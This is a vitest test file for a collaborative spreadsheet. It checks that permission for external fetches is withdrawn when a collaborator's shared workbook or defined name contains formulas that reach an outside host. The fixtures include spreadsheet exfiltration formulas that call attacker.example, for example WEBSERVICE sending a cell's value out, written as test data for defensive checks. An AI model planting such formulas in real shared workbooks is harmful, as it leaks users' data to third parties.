import { afterEach, expect, it } from 'vitest';
import { Workbook } from '../src/core/workbook.js';
import { RoomClient } from '../src/collab/client.js';
import { memoryOutbox } from '../src/collab/outbox.js';
import { call } from '../src/collab/api.js';
import { Doc } from '../src/lib/doc.js';
import { memoryStorage } from './helpers/memory-storage.js';
import { environment, owner, editor, SERVER, until } from './collab-helpers.js';

Object.defineProperty(globalThis, 'localStorage', { value: memoryStorage(), configurable: true });
const open = [];
afterEach(() => { for (const c of open.splice(0)) c.close(); });

const REACHING = '=WEBSERVICE("https://attacker.example/log?u="&A1)';

async function setup(build = () => {}) {
  const env = environment();
  const wb = new Workbook({ sheets: [{ name: 'Data' }] });
  build(wb);
  const room = await RoomClient.create({ puter: env.sdk(owner), server: SERVER, wb, name: 'Data', file: null });
  const token = (await call(env.sdk(owner), SERVER, { op: 'invite', room, role: 'editor' })).token;
  const join = async (user) => {
    const client = new RoomClient({ puter: env.sdk(user), server: SERVER, room, token: user === owner ? undefined : token, store: memoryOutbox(), poll: 50, noPeers: true });
    open.push(client);
    await client.open();
    return Doc.forRoom(client);
  };
  return { join };
}

it("asks before a stranger's shared workbook that reaches out does, as a file from elsewhere does", async () => {
  const { join } = await setup((wb) => wb.setInput(wb.sheets[0].id, 0, 1, REACHING));
  const guest = await join(editor);
  expect(guest.wb.externalAllowed).toBe(false);
  // The owner's own workbook stays as it was for them.
  const mine = await join(owner);
  expect(mine.wb.externalAllowed).toBe(true);
});

it('withdraws the yes when someone else brings a formula that reaches out, before it is shown', async () => {
  const { join } = await setup();
  const mine = await join(owner);
  const guest = await join(editor);
  expect(guest.wb.externalAllowed).toBe(true); // nothing reaches out yet
  const s = guest.wb.sheets[0].id;
  // When the workbook announces the new cell (and a view would draw it), it is already blocked.
  const seen = [];
  guest.wb.addEventListener('change', () => { if (guest.wb.sheets[0].cells.get('2,2')) seen.push(guest.wb.externalAllowed); });
  mine.wb.setInput(s, 2, 2, REACHING);
  await until(() => guest.wb.sheets[0].cells.get('2,2')?.f, 4000, 'the formula to arrive');
  expect(guest.wb.externalAllowed).toBe(false);
  expect(seen.length).toBeGreaterThan(0);
  expect(seen.every((allowed) => allowed === false)).toBe(true);
  // Allowed, it stays allowed until another one arrives, here in a defined name.
  guest.allowExternal();
  mine.wb.setInput(s, 3, 3, 'plain text with AI in it');
  await until(() => guest.wb.getValue(s, 3, 3), 4000, 'the text to arrive');
  expect(guest.wb.externalAllowed).toBe(true);
  mine.wb.defineName('Leak', '=IMPORTDATA("https://attacker.example/x")');
  await until(() => guest.wb.names?.some((n) => n.name === 'Leak'), 4000, 'the name to arrive');
  expect(guest.wb.externalAllowed).toBe(false);
  // The owner's trust is as it was: their own workbook.
  expect(mine.wb.externalAllowed).toBe(true);
});

it("does not withdraw the yes for a formula the person typed in themselves, nor for the owner when an editor's arrives", async () => {
  const { join } = await setup();
  const mine = await join(owner);
  const guest = await join(editor);
  const s = guest.wb.sheets[0].id;
  guest.wb.setInput(s, 0, 0, REACHING);
  await until(() => mine.wb.sheets[0].cells.get('0,0')?.f, 4000, 'the formula to reach the owner');
  expect(guest.wb.externalAllowed).toBe(true);
  expect(mine.wb.externalAllowed).toBe(true);
});
